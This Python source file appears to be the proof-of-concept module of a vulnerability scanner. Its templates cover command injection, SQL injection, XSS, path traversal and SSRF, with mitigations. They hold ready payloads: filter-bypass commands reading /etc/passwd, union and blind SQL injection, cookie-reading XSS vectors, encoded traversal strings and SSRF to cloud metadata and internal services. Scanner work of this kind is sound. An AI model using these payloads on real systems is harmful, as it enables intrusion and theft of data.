from typing import Dict, Optional, List
import re

class PoCGenerator:
    def __init__(self):
        self.poc_templates = {
            'command_injection': {
                'basic': '''
# Command Injection PoC
payload = 'id'  # Basic command to prove execution
vulnerable_code = f'os.system("{payload}")'
# Expected outcome: Command will be executed in the system context

# Mitigation:
# 1. Avoid using exec, eval, os.system with user input
# 2. Use subprocess.run with shell=False
# 3. Implement strict input validation
''',
                'advanced': '''
# Advanced Command Injection PoC
# Bypassing basic filters
payload = 'c"a"t /et"c"/pa"ss"wd'  # Split command to bypass filters
encoded_payload = ''.join([chr(ord(c)) for c in 'cat /etc/passwd'])
# Multiple vectors:
vectors = [
    f'os.system("{payload}")',
    f'eval("__import__(\\"os\\").system(\\"{payload}\\")")',
    f'exec("import os; os.system(\\"{payload}\\")")',
    f'subprocess.run("{payload}", shell=True)'
]
'''
            },
            'sql_injection': {
                'basic': '''
# SQL Injection PoC
# Basic authentication bypass
payload = "' OR '1'='1"
vulnerable_query = f"SELECT * FROM users WHERE username = '{payload}'"
# Expected: Returns all users

# Time-based detection
payload_time = "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
vulnerable_query_time = f"SELECT * FROM users WHERE username = '{payload_time}'"
# Expected: Query delays for 5 seconds if vulnerable

# Mitigation:
# 1. Use parameterized queries
# 2. Implement input validation
# 3. Use ORM frameworks
''',
                'advanced': '''
# Advanced SQL Injection PoC
# Union-based data extraction
payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
vulnerable_query = f"SELECT name,id FROM users WHERE username = '{payload}'"

# Blind SQL Injection
payload_blind = "' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
vulnerable_query_blind = f"SELECT * FROM users WHERE username = '{payload_blind}'"
'''
            },
            'xss': {
                'basic': '''
# XSS (Cross-Site Scripting) PoC
# Basic alert
payload = "<script>alert('XSS')</script>"
vulnerable_html = f"<div>{payload}</div>"

# Event handler
payload_event = '" onmouseover="alert(1)'
vulnerable_input = f'<input value="{payload_event}">'

# Mitigation:
# 1. Use content security policy (CSP)
# 2. Implement proper output encoding
# 3. Validate and sanitize input
''',
                'advanced': '''
# Advanced XSS PoC
# DOM-based XSS
payload_dom = '"><img src=x onerror=alert(document.cookie)>'
vulnerable_dom = f'<div id="user_input">{payload_dom}</div>'

# Encoded XSS vectors
vectors = [
    '"><svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
]
'''
            },
            'path_traversal': {
                'basic': '''
# Path Traversal PoC
# Basic directory traversal
payload = "../../../etc/passwd"
vulnerable_code = f'open("{payload}").read()'

# Mitigation:
# 1. Use os.path.abspath() to resolve paths
# 2. Implement whitelist of allowed paths
# 3. Sanitize file paths
''',
                'advanced': '''
# Advanced Path Traversal PoC
# Encoding bypass
payloads = [
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '../////...////....///etc/passwd',
    '..%252f..%252f..%252fetc%252fpasswd'
]
'''
            },
            'ssrf': {
                'basic': '''
# SSRF (Server-Side Request Forgery) PoC
# Basic internal service access
payload = "http://localhost:8080/admin"
vulnerable_code = f'requests.get("{payload}")'

# Mitigation:
# 1. Implement whitelist for allowed domains
# 2. Validate and sanitize URLs
# 3. Use firewall rules
''',
                'advanced': '''
# Advanced SSRF PoC
# Protocol exploitation
payloads = [
    'file:///etc/passwd',
    'dict://localhost:11211/stat',
    'gopher://localhost:6379/_GET%20flag',
    'http://169.254.169.254/latest/meta-data/'  # AWS metadata
]

# DNS rebinding attack
payload_dns = 'http://attacker-controlled-domain.com'
# Domain resolves to allowed host during check
# Then resolves to internal IP during actual request
'''
            }
        }

    def generate_poc(self, vulnerability_type: str, context: Dict, advanced: bool = False) -> Optional[str]:
        """
        Generate a proof of concept for the detected vulnerability
        Args:
            vulnerability_type: Type of vulnerability detected
            context: Additional context about the vulnerability
            advanced: Whether to generate advanced PoC
        Returns:
            String containing PoC code and explanation
        """
        if vulnerability_type not in self.poc_templates:
            return None

        template_type = 'advanced' if advanced else 'basic'
        poc = self.poc_templates[vulnerability_type].get(template_type, 
                self.poc_templates[vulnerability_type]['basic'])

        # Customize PoC based on context
        if context.get('match'):
            poc = poc.replace('payload = ', f'payload = # Based on detected pattern: {context["match"]}\n    payload = ')

        if context.get('line'):
            poc = f"# Vulnerability detected at line {context['line']}\n{poc}"

        return poc

    def get_mitigation_steps(self, vulnerability_type: str) -> List[str]:
        """Get recommended mitigation steps for a vulnerability type"""
        mitigations = {
            'command_injection': [
                'Use subprocess.run with shell=False',
                'Implement strict input validation',
                'Use allowlist for permitted commands',
                'Run with minimal privileges'
            ],
            'sql_injection': [
                'Use parameterized queries',
                'Implement input validation',
                'Use ORM frameworks',
                'Implement proper error handling'
            ],
            'xss': [
                'Implement Content Security Policy (CSP)',
                'Use proper output encoding',
                'Validate and sanitize input',
                'Use modern framework XSS protections'
            ],
            'path_traversal': [
                'Use os.path.abspath() to resolve paths',
                'Implement whitelist of allowed paths',
                'Sanitize file paths',
                'Use proper permissions'
            ],
            'ssrf': [
                'Implement whitelist for allowed domains',
                'Validate and sanitize URLs',
                'Use firewall rules',
                'Implement rate limiting'
            ]
        }
        return mitigations.get(vulnerability_type, ['No specific mitigations available'])
